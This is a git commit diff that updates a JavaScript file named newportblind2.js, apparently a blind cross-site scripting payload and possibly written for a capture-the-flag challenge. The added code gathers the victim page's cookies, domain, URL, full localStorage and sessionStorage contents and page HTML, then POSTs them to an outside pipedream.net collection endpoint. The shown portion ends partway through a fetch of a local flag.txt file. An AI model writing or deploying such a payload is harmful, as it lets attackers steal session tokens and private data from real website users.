f8ce1b8c4d1ff5c82949a73372113d9f180eb21d
yafa11m1 <94055107+yafa11m1@users.noreply.github.com>
2024-05-30 20:39:22 +0600

    Update and rename newportblind.js to newportblind2.js

--- newportblind2.js
+++ newportblind2.js
@@ -1,22 +1,49 @@
-const headers = new Headers()
-headers.append("Content-Type", "application/json")
+// Function to get all data from localStorage
+function getLocalStorageData() {
+  let localStorageData = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    let key = localStorage.key(i);
+    localStorageData[key] = localStorage.getItem(key);
+  }
+  return localStorageData;
+}
+
+// Function to get all data from sessionStorage
+function getSessionStorageData() {
+  let sessionStorageData = {};
+  for (let i = 0; i < sessionStorage.length; i++) {
+    let key = sessionStorage.key(i);
+    sessionStorageData[key] = sessionStorage.getItem(key);
+  }
+  return sessionStorageData;
+}
+
+// Create headers
+const headers = new Headers();
+headers.append("Content-Type", "application/json");
+
+// Create body object with localStorage and sessionStorage data
 const body = {
   "test": "Blind",
   "Domain": document.domain,
   "cookie": document.cookie,
-  "Location": document.location,
-  "body": document.body,
+  "Location": document.location.href, // Changed to document.location.href for string value
+  "localStorage": getLocalStorageData(),
+  "sessionStorage": getSessionStorageData(),
+  "body": document.body.innerHTML, // Changed to document.body.innerHTML for string value
+};
 
-}
-
+// Create options for fetch
 const options = {
   method: "POST",
   headers,
   mode: "cors",
   body: JSON.stringify(body),
-}
+};
 
+// Send request
 fetch("https://eouk09tgoyr96dk.m.pipedream.net", options)
+
 let flag = ""
 fetch('http://127.0.0.1/flag.txt')
   .then(response => {
